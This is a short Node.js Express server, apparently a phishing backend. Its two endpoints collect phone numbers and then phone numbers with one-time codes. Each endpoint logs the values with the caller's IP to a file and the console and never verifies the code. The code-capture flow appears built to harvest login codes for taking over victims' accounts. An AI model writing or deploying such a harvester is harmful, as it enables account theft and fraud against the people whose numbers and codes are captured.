const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Для Render используем /tmp, для локального теста — текущую папку
const DATA_FILE = process.env.RENDER ? path.join('/tmp', 'data.txt') : 'data.txt';

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

app.post('/api/phone', (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 7) {
        return res.status(400).json({ error: 'Invalid phone' });
    }
    const data = { phone, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('📱 Phone:', phone);
    res.json({ success: true });
});

app.post('/api/verify', (req, res) => {
    const { phone, code } = req.body;
    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }
    const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔑 Phone + Code:', phone, code);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});